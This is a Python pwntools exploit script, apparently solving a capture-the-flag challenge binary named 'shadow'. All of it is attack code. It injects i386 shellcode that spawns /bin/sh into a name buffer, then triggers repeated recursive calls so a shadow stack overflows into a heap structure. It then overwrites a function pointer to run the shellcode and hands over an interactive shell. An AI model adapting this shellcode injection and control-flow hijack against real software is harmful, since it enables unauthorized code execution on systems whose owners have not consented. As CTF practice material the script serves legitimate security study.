#!/usr/bin/env python

from pwn import *

# Set context for asm
context.clear()
context(os='linux', arch='i386', log_level='info', bits=32)

H,P = '127.0.0.1', 1337
#p = remote(H,P)

p = process('./shadow')
print util.proc.pidof(p)
pause()

p.recvline() # Hey, what's your name?

log.info('Inserting shellcode into nickname')
# write shellcode to nickname in bss segment
# can't use shellcraft.i386.linux.sh() because of whitespaces
shellcode="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload="\x90"*4+shellcode
p.sendline(payload)

p.recvline() # Welcome!
p.recvline() # menu? I forgot, bro. can you find it?

def add_one(desc_len, desc):
    p.sendline('1')
    p.recvline() # description length?
    p.sendline(str(desc_len))
    p.sendline(desc)
    p.recvline() # beer uploaded to the memory!
    return int(p.recvline().strip()) # idx of beer added

def add_one_fail():
    p.recvline() # description length?
    p.sendline(str(0x100000 + 0x1))

# create huge chunk that get's mmaped right blow the shadow-chunk
log.info('Creating heap chunk')
add_one(0x23000, 'A' * 0x23000)

#add_one(0x1000, 'a' * 0x1000)

# trigger recursion in add_one function until the shadow stack overflows into
# the beerstruct on the heap
log.info('Overflowing shadow-stack into heap')
p.sendline('1')
# (sizeof(shadow-stack) + space-page + description space) / wordsize - index-offset
for i in xrange((0x30000 + 0x1000 + 143344) / 4 - 1):
    add_one_fail()

p.recvline() # description length?
p.sendline(str(10))
p.sendline('0123456789')
p.recvline() # beer uploaded to the memory!
p.recvline() # idx of beer added

# Use buffer overflow to overwrite return address
log.info('Overflowing rip and triggering function-pointer call')
p.sendline('2')
payload=fit({0:"0",116:p32(0x0804A524)},length=254)
p.sendline(payload)

# trigger function pointer call
p.recvline() # tasty beer here! description:

# we can omit to overwrite the description size, the resulting garbe we receive
# will destroy our terminal... so we clean the input buffer first
p.clean()
p.sendline('ls')
p.recvline()
p.clean()

p.interactive()
